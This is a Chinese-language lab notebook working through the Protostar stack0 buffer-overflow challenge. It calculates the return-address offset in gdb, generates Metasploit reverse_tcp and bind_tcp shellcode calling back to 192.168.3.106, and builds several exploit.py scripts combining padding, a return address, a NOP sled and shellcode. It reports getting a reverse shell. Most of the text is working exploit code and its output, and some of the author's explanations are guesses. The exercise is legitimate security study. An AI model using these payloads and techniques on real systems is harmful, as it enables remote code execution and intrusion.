1.栈中如果将一个函数展开，一般从push ebp+mov ebp,esp+sub esp,0x??开始到leave+ret结束,将这些看作是该函数的帧,该函数的上一帧中有调用该函数的汇编语句，该函数的返回地址在栈中的位置为该函数帧的下面一个栈单元内(保存在该函数帧的下面一个栈单元内)
2.栈中内容由下至上依次为：函数的返回地址、函数的帧(由下至上从函数的上一帧中ebp的值开始)
3.gets函数通过终端输入超长字符只能覆盖main函数帧的上一帧中调用main函数时main函数的返回地址main_ret，不能覆盖main函数帧中调用gets函数时get函数的返回地址gets_ret

计算需要输入多少字符可以覆盖main_ret:

r
Start it from the beginning? (y or n)
y
info b
-------------output:-------------
Num     Type           Disp Enb Address    What
1       breakpoint     keep y   0x080483fd in main at stack0.c:7
        breakpoint already hit 1 time
2       breakpoint     keep y   0x080483fd in main at stack0.c:8
        breakpoint already hit 1 time
3       breakpoint     keep y   0x08048405 in main at stack0.c:11
4       breakpoint     keep y   0x08048411 in main at stack0.c:13
5       breakpoint     keep y   0x08048427 in main at stack0.c:15
---------------end---------------

disas /m
----------------output:--------------------
Dump of assembler code for function main:
6       {
   0x080483f4 &amp;lt;+0&amp;gt;:     push   ebp
   0x080483f5 &amp;lt;+1&amp;gt;:     mov    ebp,esp
   0x080483f7 &amp;lt;+3&amp;gt;:     and    esp,0xfffffff0
   0x080483fa &amp;lt;+6&amp;gt;:     sub    esp,0x60

7         volatile int modified;
8         char buffer[64];
9
10        modified = 0;
=&amp;gt; 0x080483fd &amp;lt;+9&amp;gt;:     mov    DWORD PTR [esp+0x5c],0x0
-----------------end-----------------------

b *0x080483f5
r
Start it from the beginning? (y or n) 
y
-------------------output:-------------------
Starting program: /root/桌面/stack0 

Breakpoint 6, 0x080483f5 in main (argc=1, argv=0xffffd594) at stack0.c:6
6       {
---------------------end---------------------

disas /m
-----------------output:-------------------
Dump of assembler code for function main:
6       {
   0x080483f4 &amp;lt;+0&amp;gt;:     push   ebp
=&amp;gt; 0x080483f5 &amp;lt;+1&amp;gt;:     mov    ebp,esp
   0x080483f7 &amp;lt;+3&amp;gt;:     and    esp,0xfffffff0
-------------------end---------------------

p $esp
-------------output:-----------------
$7 = (void *) 0xffffd4f8
---------------end-------------------

也即执行完0x080483f4后esp值为0xffffd4f8,所以要覆盖main_ret,需要输入(0xffffd4f8-0xffffd4ec)/4+16+1+1=21个栈单元=21*4=84B，也即84个字符
main_ret=0xffffd4f8+0x4=0xffffd4fc

python -c &quot;print &#39;a&#39;*80+&#39;bbbb&#39;&quot; | ./stack0     #(此时不可直接print &#39;a&#39;*80,print不支持)
------------output:------------
you have changed the &#39;modified&#39; variable
[1]    11055 done                python -c &#39;print &quot;a&quot;*80+&quot;bbbb&quot;&#39; | 
       11056 segmentation fault  ./stack0
-------------end---------------

gdb -q -c core
--------output:----------
/root/桌面/core: 没有那个文件或目录.
----------end------------

解决方法：(http://blog.csdn.net/nuoline/article/details/8610694)
ulimit -c
---------output:----------
0
------------end-----------

ulimit -c 2048
python -c &#39;print &quot;a&quot;*80+&quot;bbbb&quot;&#39; | ./stack0
------------output:--------------
you have changed the &#39;modified&#39; variable
[1]    11403 done                              python -c &#39;print &quot;a&quot;*80+&quot;bbbb&quot;&#39; | 
       11404 segmentation fault (core dumped)  ./stack0
--------------end----------------

gdb -q -c core
----------------output:---------------
[New LWP 11404]
Core was generated by `./stack0&#39;.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x62626262 in ?? ()
-----------------end------------------

从而发现某个函数(main函数)的返回地址被改写成0x62626262(bbbb),从而产生溢出错误

或者：

gdb ./stack0
b 18
si
si
此时程序将执行到达main函数帧中的ret,再si将跳转到main_ret处,可通过以下验证
-------------output:--------------
15        } else {
16            printf(&quot;Try again?\n&quot;);
   0x08048427 &amp;lt;+51&amp;gt;:    movl   $0x8048529,(%esp)
   0x0804842e &amp;lt;+58&amp;gt;:    call   0x804832c &amp;lt;puts@plt&amp;gt;

17        }
18      }
   0x08048433 &amp;lt;+63&amp;gt;:    leave  
---Type &amp;lt;return&amp;gt; to continue, or q &amp;lt;return&amp;gt; to quit---
=&amp;gt; 0x08048434 &amp;lt;+64&amp;gt;:    ret    

End of assembler dump.
(gdb) si
0x62626262 in ?? ()
--------------end-----------------

同样可以发现main_ret被溢出为0x62626262(bbbb)

检验一下：
python -c &#39;print &quot;a&quot;*80+&quot;bbcc&quot;&#39; | ./stack0
------------------output:--------------------
[New LWP 11928]
Core was generated by `./stack0&#39;.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x63636262 in ?? ()
---------------------end---------------------

最后的&quot;bbcc&quot;由于在内存中依次由上到下存放在栈空间中（在一个栈单元中可放下4个字符，在一个栈单元中从左到右存放）,而栈中由上到下或一个栈单元中的从左到右都是由内存低地址到内存高地址排列，所以bbcc(0x62626363)被翻译成eip=0x63636262

为了溢出反弹一个shell，用msf生成shellcode,并构造成如下输入链来触发shellcode的执行
&quot;a&quot;*80+addr(jmp esp)+shellcode
其中shellcode代码由msf生成，输出为py版本，反弹ip设为kali的ip:192.168.3.106,port为1111
2004 ~  » msfvenom -p linux/x64/shell/reverse_tcp LHOST=192.168.3.106 LPORT=1111 -e x86/shikata_ga_nai -b &quot;\x00&quot; --platform linux -f py 
-------------------------output:-----------------------
No Arch selected, selecting Arch: x86_64 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 (iteration=0)
x86/shikata_ga_nai chosen with final size 95
Payload size: 95 bytes
buf =  &quot;&quot;
buf += &quot;\xba\x31\x6f\x3c\x05\xd9\xca\xd9\x74\x24\xf4\x5d\x33&quot;
buf += &quot;\xc9\xb1\x12\x31\x55\x12\x83\xc5\x04\x03\x64\x61\xde&quot;
buf += &quot;\xf0\xce\x4c\xe1\x91\xc7\xf6\x84\xd0\xc7\x4e\x3e\xca&quot;
buf += &quot;\xaa\x7f\x89\x99\x16\xc1\x53\xec\x51\xce\x66\x46\x0d&quot;
buf += &quot;\xba\x41\x3e\x34\x50\x90\xe1\x2c\xa4\xca\x12\xb5\xee&quot;
buf += &quot;\x65\x64\x0c\xec\x89\x71\x39\x31\x21\x7a\xaf\xe0\x7a&quot;
buf += &quot;\xf4\xc9\x69\x6b\x5c\x7f\x44\xd3\x6f\x7a\xc1\xbd\x35&quot;
buf += &quot;\x8b\xf4\xbe\x2c&quot;
-------------------------end--------------------------

其中jmp esp的地址由msfelfscan找出，win下为msfpescan
msfelfscan -j esp /root/桌面/stack0
结果发现由于stack0的代码比较简单，里面没有jmp esp的指令，于是通过info shared来找出stack0中调用系统函数时用到的so文件，然后从so文件里找出jmp esp的地址,如下：
info shared
------------output:----------------
From        To          Syms Read   Shared Object Library
0xf7fdd860  0xf7ff50fc  Yes (*)     /lib/ld-linux.so.2     #0xf7fdd860为该动态链接库的内存加载基址
                        No          linux-gate.so.1
0xf7e14420  0xf7f44c0e  Yes (*)     /lib/i386-linux-gnu/i686/cmov/libc.so.6
(*): Shared library is missing debugging information.
--------------end------------------

然后执行msfelfscan -j esp /lib/ld-linux.so.2
----------output:-------------
[/lib/ld-linux.so.2]
0x0001813b jmp esp
0x0001bfe7 jmp esp
0x0001c24f jmp esp
------------end---------------

找到一个jmp esp地址为：0x0001813b,但是这只是偏移量
真正的地址为：0xf7fdd860+0x0001813b=0xf7ff599b

于是输入链为：
&quot;a&quot;*80+&#39;\x9b\x59\xff\xf7&#39;+shellcode
用python代码实现exploit.py：
------------exploit.py----------------
import os
import sys
buf =  &quot;&quot;
buf += &quot;\xba\x31\x6f\x3c\x05\xd9\xca\xd9\x74\x24\xf4\x5d\x33&quot;
buf += &quot;\xc9\xb1\x12\x31\x55\x12\x83\xc5\x04\x03\x64\x61\xde&quot;
buf += &quot;\xf0\xce\x4c\xe1\x91\xc7\xf6\x84\xd0\xc7\x4e\x3e\xca&quot;
buf += &quot;\xaa\x7f\x89\x99\x16\xc1\x53\xec\x51\xce\x66\x46\x0d&quot;
buf += &quot;\xba\x41\x3e\x34\x50\x90\xe1\x2c\xa4\xca\x12\xb5\xee&quot;
buf += &quot;\x65\x64\x0c\xec\x89\x71\x39\x31\x21\x7a\xaf\xe0\x7a&quot;
buf += &quot;\xf4\xc9\x69\x6b\x5c\x7f\x44\xd3\x6f\x7a\xc1\xbd\x35&quot;
buf += &quot;\x8b\xf4\xbe\x2c&quot;

jmp_esp=&quot;\x9b\x59\xff\xf7&quot;
#print jmp_esp
input=&quot;a&quot;*80+jmp_esp+buf
#print input
os.system(&quot;echo &#39;%s&#39; | ./stack0&quot; % input)
---------------end--------------------

发现上面算出来的jmp_esp=&#39;\x9b\x59\xff\xf7&#39;无法跳转到esp,可能是我的这种理解错了
换工具，rop-tool
http://www.freebuf.com/sectool/105715.html
先安装上面链接中说的capstone
http://www.capstone-engine.org/download/3.0.4/ubuntu-14.04/python-capstone_3.0.4-0.1ubuntu1_amd64.deb
然后下载rop-tool
https://t0x0sh.org/rop-tool/releases/2.4/rop-tool-Linux-x86_64
chmod +x rop-tool-Linux-x86_64
mv rop-tool-Linux-x86_64 /usr/bin/rop
rop gadget ./stack0(或者rop gadget -a ./stack0)
------------------output:--------------------
Looking gadgets, please wait...
 0x080482e5 -&amp;gt; add dword ptr [eax], eax; add byte ptr [eax + 0x5b], bl; leave ; ret ; 
 0x080482ca -&amp;gt; ret ; 
 0x08048440 -&amp;gt; push ebp; mov ebp, esp; pop ebp; ret ; 
 0x080483ef -&amp;gt; call eax; leave ; ret ; 
 0x080482e9 -&amp;gt; pop ebx; leave ; ret ; 
 0x080484a7 -&amp;gt; pop edi; pop ebp; ret ; mov ebx, dword ptr [esp]; ret ; 
 0x080482c5 -&amp;gt; add byte ptr [eax], al; add byte ptr [ebx - 0x7f], bl; ret ; 
 0x080484a7 -&amp;gt; pop edi; pop ebp; ret ; 
 0x080484f4 -&amp;gt; pop ecx; pop ebx; leave ; ret ; 
 0x080483b9 -&amp;gt; add eax, 0x8049644; add dword ptr [ebx + 0x5d5b04c4], eax; ret ; 
 0x080484a8 -&amp;gt; pop ebp; ret ; mov ebx, dword ptr [esp]; ret ; 
 0x080483ef -&amp;gt; call eax; 
 0x080484a5 -&amp;gt; pop ebx; pop esi; pop edi; pop ebp; ret ; 
 0x080482ea -&amp;gt; leave ; ret ; 
 0x080483c3 -&amp;gt; pop ebp; ret ; 
 0x080483c2 -&amp;gt; pop ebx; pop ebp; ret ; 
 0x080482e6 -&amp;gt; add byte ptr [eax], al; pop eax; pop ebx; leave ; ret ; 
 0x080482e7 -&amp;gt; add byte ptr [eax + 0x5b], bl; leave ; ret ; 
 0x080482e8 -&amp;gt; pop eax; pop ebx; leave ; ret ; 
 0x080484aa -&amp;gt; mov ebx, dword ptr [esp]; ret ; 
 0x080482c7 -&amp;gt; add byte ptr [ebx - 0x7f], bl; ret ; 
 0x080484a9 -&amp;gt; ret ; mov ebx, dword ptr [esp]; ret ; 
 0x080483be -&amp;gt; add dword ptr [ebx + 0x5d5b04c4], eax; ret ; 
 0x08048432 -&amp;gt; dec ecx; ret ; 
 0x08048441 -&amp;gt; mov ebp, esp; pop ebp; ret ; 
 0x080484a6 -&amp;gt; pop esi; pop edi; pop ebp; ret ; 
---------------------end---------------------

里面没有找到jmp esp,不理解为什么不搜索系统加载到内存的动态链接库so文件里的jmp esp，暂且不管这个问题
没有找到jmp esp,rop gadget这个功能主要是搜索用来获得ret2libc构造链中的子语句的功能，特点是每个gadget都是以ret结尾的一条或几条汇编小指令
换工具edb-debugger,kali自带，将stack0拖入edb,快捷键ctrl+o,或者从plugins选项中选择opcodesearcher工具(里面也有roptool,功能类似上面的rop-tool工具的功能,edb-debugger中的toptool功能可以看到系统内存已经加载的动态链接库列表，而上面freebuf中提到的rop-tool不能)
搜到jmp esp地址如下（由于本机kali为64位，所以显示成下图中样式，取其中32位的地址即可）
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/xinghuacai/pic/master/opcodesearcher.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;取其中的0xf773813b,替换exploit.py中jmp_esp=&quot;\x3b\x81\x73\xf7&quot;,上图中选择的/lib/i386-linux-gnu/ld-2.19.so应该是随着操作系统启动加载到系统内存中的可用动态链接库文件

运行exploit.py,结果依然不行，这个jmp_esp还是没有被执行，可能是没有找到这个地址，不理解，暂且不管这个问题
python exploit.py
----------------outpout:------------------
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�A&amp;gt;4P���do&amp;lt;$3ɱ1U�da��N&amp;gt;ʪ���SF
         91!z�ik\Dz��5�
you have changed the &#39;modified&#39; variable
Segmentation fault (core dumped)
┌─[root@x0day] - [~/桌面] - [Mon Jun 06, 07:53]
└─[$] &amp;lt;&amp;gt; gdb -q -c core 
[New LWP 7435]
Core was generated by `./stack0&#39;.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0xf773813b in ?? ()
(gdb) disas 0xf773813b
No function contains specified address.
-----------------end----------------------

无法有效利用jmp esp的方法,直接在main_ret位置上填充紧跟其后的shellcode的开始的地址，也即address(main_ret位置在内存中的地址0xffffd4fc)+0x4的结果:

shellcode_addr=0xffffd500

由于有00，在调用gets时系统复制从终端输入的超长字符串会提前停止，所以不能取0xffffd500,取成0xffffd501,在原来shellcode前面加一个nop(\x90),重新构造输入链：
&quot;a&quot;*80+&quot;\x01\xd5\ff\xff&quot;+&quot;\x90&quot;+shellcode
将exploit.py中jmp_esp替换为jmp_esp=&quot;\x01\xd5\xff\xff&quot;,并在shellcode前面加一个&quot;\x90&quot;,新的exploit.py如下:
------------------------exploit.py-------------------------------
#/usr/bin/python
import os
import sys
buf =  &quot;\x90&quot;
buf += &quot;\xba\x31\x6f\x3c\x05\xd9\xca\xd9\x74\x24\xf4\x5d\x33&quot;
buf += &quot;\xc9\xb1\x12\x31\x55\x12\x83\xc5\x04\x03\x64\x61\xde&quot;
buf += &quot;\xf0\xce\x4c\xe1\x91\xc7\xf6\x84\xd0\xc7\x4e\x3e\xca&quot;
buf += &quot;\xaa\x7f\x89\x99\x16\xc1\x53\xec\x51\xce\x66\x46\x0d&quot;
buf += &quot;\xba\x41\x3e\x34\x50\x90\xe1\x2c\xa4\xca\x12\xb5\xee&quot;
buf += &quot;\x65\x64\x0c\xec\x89\x71\x39\x31\x21\x7a\xaf\xe0\x7a&quot;
buf += &quot;\xf4\xc9\x69\x6b\x5c\x7f\x44\xd3\x6f\x7a\xc1\xbd\x35&quot;
buf += &quot;\x8b\xf4\xbe\x2c&quot;

jmp_esp=&quot;\x01\xd5\xff\xff&quot;
#print jmp_esp
input=&quot;a&quot;*80+jmp_esp+buf
print input
os.system(&quot;echo &#39;%s&#39; | ./stack0&quot; % input)
----------------------------end----------------------------------

结果依然失败
-----------------output:---------------------
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa���1o&amp;lt;$3ɱ1U�da��N&amp;gt;ʪ����A&amp;gt;4P���d
         91!z�ik\Dz��5�
you have changed the &#39;modified&#39; variable
Segmentation fault (core dumped)
┌─[root@x0day] - [~/桌面] - [Mon Jun 06, 08:33]
└─[$] &amp;lt;&amp;gt; gdb -q -c core 
[New LWP 32688]
Core was generated by `./stack0&#39;.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0xffffd501 in ?? ()
------------------end------------------------

重新运行./stack0,手工输入:
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa1234bbbb
其中1234对应为main_ret位置，bbbb为原来的shellcode位置
产生core文件后
gdb -q -c core
--------output:---------
[New LWP 25058]
Core was generated by `./stack0&#39;.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x34333231 in ?? ()
---------end------------

x/4 $esp
------output:---------
0xff85ffc0:     0x62626262      0xff860000      0xff86005c      0xf77e679a
-------end------------

x/4 $esp-4
------output:---------
0xff85ffbc:     0x34333231      0x62626262      0xff860000      0xff86005c
--------end-----------

易知从这里（core)看到的shellcode开始的位置应该从0xff85ffc0开始（上面exploit.py中不在shellcode前加nop时使用的地址是0xffffd500）
而0xff85ffc0中没有\x00不影响直接执行shellcode,不加nop,构造成如下输入链：
&quot;a&quot;*80+&quot;\xc0\xff\x85\xff&quot;+shellcode
在exploit.py中具体如下：
-----------------exploit.py-------------------
#/usr/bin/python
import os
import sys
buf =  &quot;&quot;
buf += &quot;\xba\x31\x6f\x3c\x05\xd9\xca\xd9\x74\x24\xf4\x5d\x33&quot;
buf += &quot;\xc9\xb1\x12\x31\x55\x12\x83\xc5\x04\x03\x64\x61\xde&quot;
buf += &quot;\xf0\xce\x4c\xe1\x91\xc7\xf6\x84\xd0\xc7\x4e\x3e\xca&quot;
buf += &quot;\xaa\x7f\x89\x99\x16\xc1\x53\xec\x51\xce\x66\x46\x0d&quot;
buf += &quot;\xba\x41\x3e\x34\x50\x90\xe1\x2c\xa4\xca\x12\xb5\xee&quot;
buf += &quot;\x65\x64\x0c\xec\x89\x71\x39\x31\x21\x7a\xaf\xe0\x7a&quot;
buf += &quot;\xf4\xc9\x69\x6b\x5c\x7f\x44\xd3\x6f\x7a\xc1\xbd\x35&quot;
buf += &quot;\x8b\xf4\xbe\x2c&quot;

jmp_esp=&quot;\xc0\xff\x85\xff&quot;
#print jmp_esp
input=&quot;a&quot;*80+jmp_esp+buf
print input
os.system(&quot;echo &#39;%s&#39; | ./stack0&quot; % input)
-------------------end0-----------------------

python exploit.py
-----------output:--------------
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�����1o�A&amp;gt;4P���d��N&amp;gt;ʪ���SF
         91!z�ik\Dz��5�
you have changed the &#39;modified&#39; variable
Segmentation fault (core dumped)
------------end-----------------

gdb -q -c core
-------------output:---------------
[New LWP 2220]
Core was generated by `./stack0&#39;.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0xff85ffc0 in ?? ()
---------------end-----------------

依然在新的0xff85ffc0无法执行
x/40x $esp-4
----------output:------------
0xffe11e0c:     0xff85ffc0      0x3c6f31ba      0xd9cad905      0x5df42474
----------end----------------

可以看到此时应该将0xff85ffc0改成0xffe11e0c+0x4=0xffe11e10才会执行后面的shellcode(内容从0x3c6f31ba开始)
说明shellcode每次在内存中的位置都是变化的
后来又发现下面三种方法特点不同：
方法1：
    gdb ./stack0
    人工输入aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa1234bbbb
    每次shellcode的位置（bbbb处)在内存中的地址都是0xffffd500
方法2:
    ./stack0
    人工输入aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa1234bbbb
    gdb -q -c core
    从core文件中发现每次shellcode的位置（bbbb处）在内存中的地址都是变化的
方法3:
    vi exploit.py
    ------------exploit.py--------------
    #/usr/bin/python
    import os
    import sys
    buf =  &quot;&quot;
    buf += &quot;\xba\x31\x6f\x3c\x05\xd9\xca\xd9\x74\x24\xf4\x5d\x33&quot;
    buf += &quot;\xc9\xb1\x12\x31\x55\x12\x83\xc5\x04\x03\x64\x61\xde&quot;
    buf += &quot;\xf0\xce\x4c\xe1\x91\xc7\xf6\x84\xd0\xc7\x4e\x3e\xca&quot;
    buf += &quot;\xaa\x7f\x89\x99\x16\xc1\x53\xec\x51\xce\x66\x46\x0d&quot;
    buf += &quot;\xba\x41\x3e\x34\x50\x90\xe1\x2c\xa4\xca\x12\xb5\xee&quot;
    buf += &quot;\x65\x64\x0c\xec\x89\x71\x39\x31\x21\x7a\xaf\xe0\x7a&quot;
    buf += &quot;\xf4\xc9\x69\x6b\x5c\x7f\x44\xd3\x6f\x7a\xc1\xbd\x35&quot;
    buf += &quot;\x8b\xf4\xbe\x2c&quot;
    
    jmp_esp=&quot;some addr&quot;
    #print jmp_esp
    input=&quot;a&quot;*80+jmp_esp+buf
    print input
    os.system(&quot;echo &#39;%s&#39; | ./stack0&quot; % input)
    ---------------end------------------

    gdb -q -c core
    从core文件中分析出的shellcode的位置（\xba\x31\x6f\x3c开始)都是变化的

通过这三种不同情况得出结论:
    1.linux的真实情况是每次shellcode在内存中的地址是变化的
    2.不能gdb ./stack0来看shellcode的内存地址，要通过gdb -q -c core来分析出系统运行./stack0时的真实情况,方法2和3都可行
    3.gdb ./stack0时，可能是系统判断有人在调度，所以故意让shellcode的内存地址每次都不变，用来干扰判断
    4.想直接在&quot;a&quot;*80+&quot;1234&quot;+&quot;bbbb&quot;中的1234的位置上写入shellcode的起始地址是行不能的，只能用jmp esp或其他方法

突然想到，在edb-debugger工具中找到的jmp esp的地址放入exploit.py中的jmp_esp中最后没有成功有可能是因为kali的安全防护功能，其中的系统内存中加载的/lib/i386-linux-gnu/ld-2.19.so有安全设置
下载checksec.sh检查一下：http://www.trapkit.de/tools/checksec.sh
chmod +x ./checksec.sh
./checksec.sh --file /lib/i386-linux-gnu/ld-2.19.so
-------------output:----------------
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    DSO             No RPATH   No RUNPATH   /lib/i386-linux-gnu/ld-2.19.so
---------------end------------------

其中的NX enabled可以看出的确是这个原因
检查下./stack0：
发现也是NX enabled,这个stack0应该是我在kali上用gcc -g -o stack0 stack0.c编译出来的,默认有安全防护
复制原系统protostar中的/opt/protostar/bin/stack0到kali中
scp user:192.168.2.144:/opt/protostar/bin/stack0 /root/桌面
./checksec.sh --file stack0
-----------output:-----------
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   stack0
-------------end-------------

这个才是原题protostar系统中的stack0,但是原系统中(protostar)溢出时无法产生core文件,无法分析执行时的shellcode和main_ret地址
无法产生core文件应该是由于protostar默认的user用户的权限对suid=root的/opt/protostar/bin/stack0文件权限不足以在发生溢出时产生core文件

解决方法：
cp /opt/protostar/bin/stack0 /tmp
这样/tmp/stack0就是user用户的文件了，溢出时可以正常产生core文件,但是没有原来/opt/protostar/bin/stack0的suid=root属性
开始一直是通过ssh user@192.168.2.144到protostar系统进行远程操作的，后来发现ssh登录时和直接在protostar系统中操作时不同，这两种情况下运行:
python exploit.py
在内存中分配的地址不同

ssh user@192.168.2.144时shellcode的内存地址为0xbffff790
直接在protostar虚拟机中操作时shellcode的内存地址为0xbffff880

后来以改为直接在protostar系统中操作,将jmp_esp的值改为&quot;\x80\xf8\xff\xbf&quot;
重新由下面语句生成shellcode,由原来的x64改成x86,LPORT改成2222(kali为64位系统,protostar为32位系统)

msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.3.106 LPORT=2222 -b &quot;\x00&quot; -f py
exploit.py代码如下：
-------------------exploit.py-----------------------
#/usr/bin/python
import os
import sys

buf =  &quot;&quot;
buf += &quot;\xd9\xf6\xd9\x74\x24\xf4\x5e\x31\xc9\xb1\x12\xbb\xbe&quot;
buf += &quot;\x35\xbf\xc5\x31\x5e\x1a\x83\xc6\x04\x03\x5e\x16\xe2&quot;
buf += &quot;\x4b\x04\x64\x32\x50\x34\xd9\xee\xfc\xb9\x6d\x76\x89&quot;
buf += &quot;\x5f\x40\xf7\x1e\xc4\x33\x38\x88\xf8\xa9\xd0\xca\xfe&quot;
buf += &quot;\x25\x8f\x43\x1f\x5f\xa9\x0b\xb0\xf1\x62\x22\xd1\xb1&quot;
buf += &quot;\x41\xb4\xa0\x31\xe3\xb4\xd4\x3d\x13\x3d\x37\xfc\xf8&quot;
buf += &quot;\x31\x79\x1c\xf2\xf9\x04\x2e\x8b\xa2\x7f\x51\x15\xe2&quot;
buf += &quot;\x8c\x22\x25\xc7\x0d\xbd\xcb&quot;

jmp_esp=&quot;\x70\xf8\xff\xbf&quot;
#print jmp_esp
input=&quot;a&quot;*80+jmp_esp+buf
print input
os.system(&quot;echo &#39;%s&#39; | ./stack0&quot; % input)
-----------------end--------------------------------

发现还是无法反弹shell,于是在shellcode前加一串nop试试，发现加9个以上的nop（\x90)可以成功反弹shell
加上nop后代码如下:
----------------------exploit.py--------------------------
#/usr/bin/python
import os
import sys

buf =  &quot;\x90&quot;*9
buf += &quot;\xd9\xf6\xd9\x74\x24\xf4\x5e\x31\xc9\xb1\x12\xbb\xbe&quot;
buf += &quot;\x35\xbf\xc5\x31\x5e\x1a\x83\xc6\x04\x03\x5e\x16\xe2&quot;
buf += &quot;\x4b\x04\x64\x32\x50\x34\xd9\xee\xfc\xb9\x6d\x76\x89&quot;
buf += &quot;\x5f\x40\xf7\x1e\xc4\x33\x38\x88\xf8\xa9\xd0\xca\xfe&quot;
buf += &quot;\x25\x8f\x43\x1f\x5f\xa9\x0b\xb0\xf1\x62\x22\xd1\xb1&quot;
buf += &quot;\x41\xb4\xa0\x31\xe3\xb4\xd4\x3d\x13\x3d\x37\xfc\xf8&quot;
buf += &quot;\x31\x79\x1c\xf2\xf9\x04\x2e\x8b\xa2\x7f\x51\x15\xe2&quot;
buf += &quot;\x8c\x22\x25\xc7\x0d\xbd\xcb&quot;

jmp_esp=&quot;\x70\xf8\xff\xbf&quot;
#print jmp_esp
input=&quot;a&quot;*80+jmp_esp+buf
print input
os.system(&quot;echo &#39;%s&#39; | ./stack0&quot; % input)
------------------------end-------------------------------

而经检验并不是shellcode在内存中的位置(0x0xbffff880)定位不准的问题,应该是由于以下原因造成：

上面msfvenom生成shellcode时，由于加了-b &quot;\x00&quot;参数，msfvenom默认用x86/shikata_ga_nai编码器编码，解码过程需要shellcode前面有一些空间（这里是9个字节大小的空间）用来帮助完成shellcode的解码过程
shellcode前面加上9个以上的nop后shellcode顺利的完成了解码，反弹了shell（本地事先用相同的payload+multi/handler监听,如果用nc -lvp 2222来监听不能建立shell的连接,用nc -lvp只能看到connect，然后就断了）
但是由于protostar系统是个liveCD系统，反弹的shell连上以后马上会断,应该是由于&quot;光盘&quot;特殊的原因
这样看来，并不是msf产生的shellcode就是毋庸置疑完全可靠的，前面竟要9个以上的空间才可支持其解码后顺利运行

用同样的方法在kali上尝试溢出反弹shell,将protostar系统中的stack0复制到kali上
scp user@192.168.3.105:/opt/protostar/bin/stack0 /root/桌面
用msfvenom重新生成shellcode:

msfvenom -p linux/x64/shell/bind_tcp LHOST=192.168.3.106 LPORT=2222 -b &quot;\x00&quot; -f py
-------------------------output:-------------------------
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86_64 from the payload
Found 2 compatible encoders
Attempting to encode payload with 1 iterations of x64/xor
x64/xor succeeded with size 119 (iteration=0)
x64/xor chosen with final size 119
Payload size: 119 bytes
buf =  &quot;&quot;
buf += &quot;\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05&quot;
buf += &quot;\xef\xff\xff\xff\x48\xbb\x53\xdd\xa7\x9c\xa2\x89\xbe&quot;
buf += &quot;\x05\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4&quot;
buf += &quot;\x39\xf4\xff\x05\xc8\x8b\xe1\x6f\x52\x83\xa8\x99\xea&quot;
buf += &quot;\x1e\xec\xc2\x57\xf9\xa5\x9c\xaa\x27\xf6\x8c\xb5\xb7&quot;
buf += &quot;\xb7\xc6\xc8\xb8\xe6\x0a\x56\x84\xcd\xae\xfa\x86\xbb&quot;
buf += &quot;\x4d\xc5\xb7\x8c\xc4\xad\x8c\xee\x53\x0c\xb7\xae\xc4&quot;
buf += &quot;\x3b\x3f\xae\x4d\xda\x0b\xea\xad\x6b\xe3\x9c\x44\x09&quot;
buf += &quot;\x6f\xa0\x93\xa7\xc1\x28\x4d\xc4\x82\xa8\x99\x5d\x6f&quot;
buf += &quot;\xbe\x05&quot;
--------------------------end----------------------------

此时exploit.py如下：

---------------------exploit.py------------------------
#/usr/bin/python
import os
import sys

buf =  &quot;bbbb&quot;
buf += &quot;\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05&quot;
buf += &quot;\xef\xff\xff\xff\x48\xbb\x53\xdd\xa7\x9c\xa2\x89\xbe&quot;
buf += &quot;\x05\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4&quot;
buf += &quot;\x39\xf4\xff\x05\xc8\x8b\xe1\x6f\x52\x83\xa8\x99\xea&quot;
buf += &quot;\x1e\xec\xc2\x57\xf9\xa5\x9c\xaa\x27\xf6\x8c\xb5\xb7&quot;
buf += &quot;\xb7\xc6\xc8\xb8\xe6\x0a\x56\x84\xcd\xae\xfa\x86\xbb&quot;
buf += &quot;\x4d\xc5\xb7\x8c\xc4\xad\x8c\xee\x53\x0c\xb7\xae\xc4&quot;
buf += &quot;\x3b\x3f\xae\x4d\xda\x0b\xea\xad\x6b\xe3\x9c\x44\x09&quot;
buf += &quot;\x6f\xa0\x93\xa7\xc1\x28\x4d\xc4\x82\xa8\x99\x5d\x6f&quot;
buf += &quot;\xbe\x05&quot;

jmp_esp=&quot;\xff\x48\x87\xa0&quot;    #此处jmp_esp暂时不确定
#print jmp_esp
input=&quot;a&quot;*80+jmp_esp+buf
print input
os.system(&quot;echo &#39;%s&#39; | ./stack0&quot; % input)
-----------------------end-----------------------------

